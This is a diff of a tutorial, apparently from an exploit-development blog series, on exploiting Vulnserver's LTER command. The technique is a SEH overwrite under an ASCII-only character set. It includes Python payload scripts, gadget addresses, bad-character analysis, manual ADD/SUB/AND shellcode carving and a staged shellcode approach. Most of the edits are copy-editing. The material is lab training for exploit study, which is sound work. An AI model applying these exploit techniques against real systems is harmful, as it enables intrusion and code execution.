@@ -36,8 +36,8 @@ use a link:../vulnserver-kstet/[multistage exploit] to get our shell.
 So far, we've been faced with mostly buffer space issues, but with little
 to none restrictions on what kind of instructions we were allowed to use.
 
-In fact, instruction restrictions are the rule. Think about exploiting a
-'Host' HTTP header: A host name normally is only alphanumeric and few
+But in fact, instruction restrictions are the rule. Think about exploiting a
+`Host` HTTP header: A host name normally is only alphanumeric and few
 other chars are allowed. If we are going to inject code on that header, we
 would be surely limited to use instructions whose opcodes are in the allowed
 list.
@@ -130,21 +130,14 @@ PAYLOAD = (
 
 with socket.create_connection((HOST, PORT)) as fd:
     fd.sendall(PAYLOAD)
-    fd.recv(128)
 ----
 
 And run it:
 
 image::pattern1.gif[Pattern]
 
-The SEH handler was overwritten with `356F4534`, we can check the offset
-using `!mona findmsp` inside the debugger:
-
-image::mona1.png[Pattern offset]
-
-Here `mona` is telling us that the `nSEH` field was overwritten at byte `3550`.
-That means that the SEH handler was overwritten 4 bytes above. Let's check it
-with `pattern_offset.rb`:
+The SEH handler was overwritten with `356F4534`. We can check the offset
+using `pattern_offset.rb`:
 
 [source,bash]
 ----
@@ -152,7 +145,8 @@ $ msf-pattern_offset -q 356F4534
 [*] Exact match at offset 3554
 ----
 
-We're right. Let's update our exploit to reflect that offset:
+That means that the SEH handler was overwritten starting at byte `3554`.
+Let's update our exploit to reflect that offset:
 
 [source,python]
 ----
@@ -183,7 +177,7 @@ image::eip1.png[Pattern OK]
 The stack window (bottom right) shows that our buffer is 8 bytes below the
 stack pointer `ESP`, so we need to find a `POP/POP/RET` sequence on the
 executable modules of Vulnserver that makes us land directly over the `nSEH`
-field which we now control. `mona` can help us again:
+field which we now control. `mona` can help us:
 
 image::poppopret1.png[POP POP RET]
 
@@ -216,12 +210,12 @@ with socket.create_connection((HOST, PORT)) as fd:
     fd.sendall(PAYLOAD)
 ----
 
-We'd should be able to run that sequence that will direct the
+With that, we'd be able to run that sequence that will direct the
 execution flow to our controlled buffer. Let's check it:
 
 image::badchar1.gif[Badchar return address]
 
-Hummm something's not quite right. We injected the `625010B4` address but
+Hummm something's not quite right. We injected `625010B4` but
 for some reason the application turned the last byte of the address, `B4`
 to `35` and got `62501035` instead. We didn't expect that.
 
@@ -234,8 +228,8 @@ Let's look at this image
 
 image::ansi1.png[ANSI]
 
-We can see here that our application works with `ANSI` encoded strings
-instead of `UNICODE` strings. `ANSI` chars are 1 byte long, that means that
+We can see here that our application works with `ANSI` encoded strings.
+`ANSI` chars are 1 byte long, which means that
 all the available `ANSI` chars are in the range from `0x00` to `0xff`.
 
 With that in mind, we need to know which of those 256 possible `ANSI` chars
@@ -300,7 +294,7 @@ with socket.create_connection((HOST, PORT)) as fd:
 Now, run this updated exploit to check how are all the chars treated by the
 `LTER` command:
 
-image::check_badchars1.gif[Checking bad chars]
+image::check-badchars1.gif[Checking bad chars]
 
 We can see several things here:
 
@@ -318,11 +312,11 @@ There is a more graphical way to check that, using `mona` once again:
 ----
 
 This will tell `mona` to compare the contents of the previously created
-file `C:\mona\vulnserver\bytearray.bin` with the contents of memory on
-where our bad chars array started to happen. In the previous example, the
+file `C:\mona\vulnserver\bytearray.bin` with the contents of the memory on
+where our bad chars array started. In the previous example, the
 bad chars was started to be injected on `00F0F1EE`:
 
-image::badchars_start.png[Bad chars start]
+image::badchars-start.png[Bad chars start]
 
 So the `mona` command would be:
 
@@ -333,9 +327,9 @@ So the `mona` command would be:
 
 And the output would be:
 
-image::mona_cmp1.gif[Mona cmp]
+image::mona-cmp1.gif[Mona cmp]
 
-Here is the resulting comparision table:
+Here is the resulting comparison table:
 
 [source,text]
 ----
@@ -393,8 +387,8 @@ our previously injected address `625010B4` was translated to `62501035`.
 
 == Allowed charset
 
-In the previous section we were able to narrow the allowed character set that
-was allowed for us to inject code. The allowed characters range from hex
+In the previous section we were able to narrow the character set that
+was allowed for us to inject code. The characters range from hex
 `0x1` to `0x7f`, excluding `0xa` and `0xd`. That range belongs to what's
 known as the ASCII character set. In Linux, you can see the ASCII
 table using the command `man 7 ascii`. However, a simple search on Google
@@ -404,10 +398,8 @@ This means that for now on, we are limited to work with that set of
 characters.
 
 The first thing we need to do is to search another `POP/POP/RET` gadget on
-a pointer that contains only bytes allowed on our character set. Just before
-we used the command `!mona seh -cm safeseh=off -cp nonull -o` to check
-the available `POP/POP/RET` gadgets that, among other filters, does not contain
-null bytes. Now, we can issue another command filtering the `POP/POP/RET`
+a pointer that contains only bytes allowed on our character set. To do that,
+we can issue another command filtering the `POP/POP/RET`
 gadgets containing only ASCII bytes and excluding `0xa` and `0xd`:
 
 [source,bash]
@@ -417,7 +409,7 @@ gadgets containing only ASCII bytes and excluding `0xa` and `0xd`:
 
 Fortunately for us, there's 3 pointers that fulfill all our requirements:
 
-image::ascii_poppopret1.png[ASCII POP/POP/RET]
+image::ascii-poppopret1.png[ASCII POP/POP/RET]
 
 Let's choose the first result at `6250172B` and update our exploit:
 
@@ -477,15 +469,15 @@ predicated logic and use two opposite 2-bytes conditional jumps. The logic
 is simple:
 
 . Having `Bool(ZF) = unknown`
-. As we don't know the corrent value of `ZF`, predicated logic says that
+. As we don't know the current value of `ZF`, predicated logic says that
 `Bool(ZF) || ~Bool(ZF) == true`
 
-So, instead of inject a simple `JNZ SHORT +0x8`, we will inject two
+So, instead of injecting a simple `JNZ SHORT +0x8`, we will inject two
 conditional jumps:
 
 [source,asm]
 ----
-\x75\x08      ; JNZ SHORT +0x10: Will jmp if ZF is 1
+\x75\x08      ; JNZ SHORT +0x10: Will jump if ZF is 1
 \x74\x06      ; JZ SHORT +0x8: If the previous jump didn't happen (ZF is 0), jump!
 ----
 
@@ -504,7 +496,7 @@ PORT = 9999
 PAYLOAD = (
     b'LTER .' +
     b'A' * (3554 - 4) +
-    # JNZ SHORT +0x10: Will jmp if ZF is 1
+    # JNZ SHORT +0x10: Will jump if ZF is 1
     b'\x75\x08' +
     # JZ SHORT +0x8: If the previous jump didn't happen (ZF is 0), jump!
     b'\x74\x06' +
@@ -551,7 +543,7 @@ As we can see, we'd need to inject an encoded version of `E9 13 F2 FF FF`
 First, we're going to try existing encoders. We will try those
 available on `msfvenom` that generate an alphanumeric shellcode:
 
-image::failed_encoders1.gif[Failed encoders]
+image::failed-encoders1.gif[Failed encoders]
 
 Having a restricted 41 byte buffer, the common alphanumeric encoders are
 not viable:
@@ -560,7 +552,7 @@ not viable:
 . `x86/add_sub` failed.
 . `x86/opt_sub` produced a 61 byte shellcode.
 
-Maybe the long jump instruction is too large. Let's try with the largest
+Maybe the long jump instruction is too large. Let's try with the farest
 backward short jump possible `JMP SHORT +0x80 = \xeb\x80`:
 
 [source,bash]
@@ -589,11 +581,11 @@ short jump manually.
 
 == Manual encoding
 
-Having in mind our allowed characters set, the technique we will use is
+Having our restricted allowed characters set, the technique we will use is
 something known as ADD/SUB/AND encoding. The technique is fully described
 link:https://vellosec.net/2018/08/carving-shellcode-using-restrictive-character-sets/[here].
 
-Basically, what we will need to do is the following:
+Basically, what we'll need to do is the following:
 
 . Point `ESP` to a place that will be in the execution flow path.
 . Manipulate `EAX` using `ADD`, `SUB` or `AND` instructions to make it hold
@@ -603,7 +595,7 @@ our desired `\xeb\x80` value.
 
 To accomplish the first point, we need to do the following:
 
-. Get the current value of `ESP`
+. Get the current value of `ESP`.
 . Get the offset between the current `ESP` location and the place where we
 want it to be. Remember that it must be later on our execution path.
 . `ADD` that offset to `ESP`, so it effectively points to the new location.
@@ -626,7 +618,7 @@ PORT = 9999
 PAYLOAD = (
     b'LTER .' +
     b'A' * (3554 - 4) +
-    # JNZ SHORT +0x10: Will jmp if ZF is 1
+    # JNZ SHORT +0x10: Will jump if ZF is 1
     b'\x75\x08' +
     # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
     b'\x74\x06' +
@@ -652,22 +644,22 @@ And check it. If it works, `ESP` must point to the very end of our `C` buffer:
 
 image::align-esp2.gif[Align ESP]
 
-Great! It means that any `PUSH` instruction will put thing in that place. And
-that's exactly what we need to do.
+Great! It means that any `PUSH` instruction will put things in that place. And
+that's exactly what we wanted to do.
 
 === Carve short jump
 
 With that in place, we need to make `EAX` holds our short backwards jump bytes,
 `\xeb\x80`. But we need to do it the right way:
 
-. Remember that `EAX` is a 32 bit register, so we must need to pad it with
-two NOPs. The resultant expected value should be '\xeb\x80\x90\x90'.
+. Remember that `EAX` is a 32 bit register, so we must pad it with
+two NOPs. The resultant expected value should be `\xeb\x80\x90\x90`.
 . As we are pushing that on the stack, and having in mind that the x86
 architecture is little endian, we must reverse that value and make EAX equals
-to `\x90\x90\x80\xeb` and thus, when the `PUSH EAX` occurs, the injected value
-would be '\xeb\x80\x90\x90'.
+to `\x90\x90\x80\xeb` and then, when the `PUSH EAX` occurs, the injected value
+would be `\xeb\x80\x90\x90`.
 
-First, we need to zero out `EAX`. This can be done using a couple of `ADD`
+First, we need to zero out `EAX`. This can be done using a couple of `AND`
 instructions:
 
 [source,asm]
@@ -681,13 +673,13 @@ This will work because:
 [source,txt]
 ----
 504A5050 = 1010000010010100101000001010000
-&&
+                                       AND
 2A302A2A = 0101010001100000010101000101010
 __________________________________________
            0000000000000000000000000000000
 ----
 
-Then we need to find some values that, when added, result on `909080eb`.
+Then, we need to find some values that, when added, result on `909080eb`.
 If we divide `909080eb` by two, we will get `48484075.8`. So we can add
 `48484075` to `EAX` and then add `48484076` to make it `909080eb`.
 
@@ -717,7 +709,7 @@ PORT = 9999
 PAYLOAD = (
     b'LTER .' +
     b'A' * (3554 - 4) +
-    # JNZ SHORT +0x10: Will jmp if ZF is 1
+    # JNZ SHORT +0x10: Will jump if ZF is 1
     b'\x75\x08' +
     # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
     b'\x74\x06' +
@@ -796,7 +788,7 @@ PAYLOAD = (
     b'\x50' +           # PUSH EAX
     b'\x5c' +           # POP ESP
     b'A' * (79 - 6) +   # Fill the rest of our buffer with A
-    # JNZ SHORT +0x10: Will jmp if ZF is 1
+    # JNZ SHORT +0x10: Will jump if ZF is 1
     b'\x75\x08' +
     # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
     b'\x74\x06' +
@@ -874,7 +866,7 @@ PAYLOAD = (
     b'\x5c' +           # POP ESP
     LONG_JUMP +
     b'A' * (79 - 6 - len(LONG_JUMP)) +   # Fill the rest of our buffer with A
-    # JNZ SHORT +0x10: Will jmp if ZF is 1
+    # JNZ SHORT +0x10: Will jump if ZF is 1
     b'\x75\x08' +
     # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
     b'\x74\x06' +
@@ -993,8 +985,8 @@ push eax            ; Push the resultant value of EAX to the stack
 pop esp             ; Pop it back the ESP
 ----
 
-And update our exploit with that. Remember add a padding in the first
-bytes so our long jump lands there:
+And update our exploit with that. Remember to add a padding in the first
+bytes so our long jump lands there and the execution slides to our stager:
 
 [source,python]
 ----
@@ -1043,7 +1035,7 @@ PAYLOAD = (
     b'\x5c' +           # POP ESP
     LONG_JUMP +
     b'A' * (79 - 6 - len(LONG_JUMP)) +   # Fill the rest of our buffer with A
-    # JNZ SHORT +0x10: Will jmp if ZF is 1
+    # JNZ SHORT +0x10: Will jump if ZF is 1
     b'\x75\x08' +
     # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
     b'\x74\x06' +
@@ -1077,9 +1069,9 @@ And check it:
 
 image::stager2.gif[Stager success]
 
-Weeeh! Now, to finish, we can create our shellcode and inserted on our side
-channel. As we control now the `recv()` call, we are not limited by the
-bad chars now! Let's do that:
+Weeeh! Now to finish, we can create our shellcode and insert it on our side
+channel created by the stager. As we now control the `recv()` call, we are not
+limited by the bad chars now! Let's do that:
 
 [source,bash]
 ----
@@ -1202,7 +1194,7 @@ PAYLOAD = (
     b'\x5c' +           # POP ESP
     LONG_JUMP +
     b'A' * (79 - 6 - len(LONG_JUMP)) +   # Fill the rest of our buffer with A
-    # JNZ SHORT +0x10: Will jmp if ZF is 1
+    # JNZ SHORT +0x10: Will jump if ZF is 1
     b'\x75\x08' +
     # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
     b'\x74\x06' +
